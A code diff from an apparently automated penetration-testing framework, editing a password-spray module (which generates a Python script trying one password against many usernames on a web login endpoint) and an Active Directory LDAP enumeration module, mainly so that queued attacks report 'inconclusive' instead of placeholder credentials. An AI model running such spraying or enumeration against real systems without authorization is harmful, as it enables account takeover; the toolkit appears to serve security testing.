@@ -72,16 +72,17 @@ class PasswordSpray(AttackModule):
                 "avoid lockouts. For AD/SMB targets prefer the password_spray MCP "
                 "tool (nxc-based); this script targets web /api/login."
             ),
-            # Phase 3: a successful spray yields credentials -- declare the
-            # finding shape so record_success surfaces it.
-            "credentials_found": ["<VALID_CREDS: printed by script on SUCCESS>"],
-            "evidence": [f"password spray queued against {ctx.target_ip}"],
+            # Recipe only queues the spray -- credentials are parsed from the
+            # executed script's SUCCESS lines by the dispatcher, never here.
+            "confidence": 0.4,
+            "verdict": "inconclusive",
+            "evidence": [f"password spray queued against {ctx.target_ip} (not executed)"],
             "references": ["https://www.thehacker.recipes/a-d/movement/credentials/spraying"],
         }
 
     def generate_python_script(self, ctx: ModuleContext) -> str:
         return f'''"""Password Spray Attack — one password, many users, low-and-slow."""
-import concurrent.futures, json, sys, time, urllib.request, urllib.error
+import json, sys, time, urllib.request, urllib.error
 
 TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
 PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80
@@ -119,11 +120,14 @@ def try_login(username: str, password: str) -> dict:
             body = resp.read(2048).decode(errors="replace")
             return {{"username": username, "password": password, "status": resp.status, "success": True, "body": body[:200]}}
     except urllib.error.HTTPError as e:
-        body = e.read().decode(errors="replace")
-        # 401/403 = valid user, wrong password. 200/302 = success.
-        if e.code in (200, 302):
-            return {{"username": username, "password": password, "status": e.code, "success": True, "body": body[:200]}}
-        return {{"username": username, "password": password, "status": e.code, "success": False}}
+        try:
+            body = e.read().decode(errors="replace")
+        except Exception:
+            body = ""
+        # HTTPError only fires for 4xx/5xx -- a 200/302 success arrives via
+        # the urlopen path above, never here. Treat 401/403 as valid-user /
+        # wrong-password signal, everything else as failure.
+        return {{"username": username, "password": password, "status": e.code, "success": False, "body": body[:200]}}
     except Exception as e:
         return {{"username": username, "password": password, "error": str(e)}}
 
@@ -363,12 +367,12 @@ class ADLDAPEnum(AttackModule):
                 "preauth-disabled and SPN-backed accounts are classified by "
                 "attribute, not DN substring."
             ),
-            "credentials_found": [
-                "<USERS_FILE: ...>",
-                "<SPN_ACCOUNTS_FILE: ...>",
-                "<PREAUTH_DISABLED_FILE: ...>",
-            ],
-            "evidence": [f"LDAP enumeration queued against {ctx.target_ip}"],
+            # Recipe only queues enumeration -- the user list is parsed from
+            # the executed script's output by the dispatcher, never here.
+            "confidence": 0.4,
+            "verdict": "inconclusive",
+            "produced_artifacts": [],
+            "evidence": [f"LDAP enumeration queued against {ctx.target_ip} (not executed)"],
             "references": [
                 "https://github.com/fortra/impacket/blob/master/examples/GetADUsers.py",
                 "https://ldap.com/ldapv3-wire-protocol-reference/",
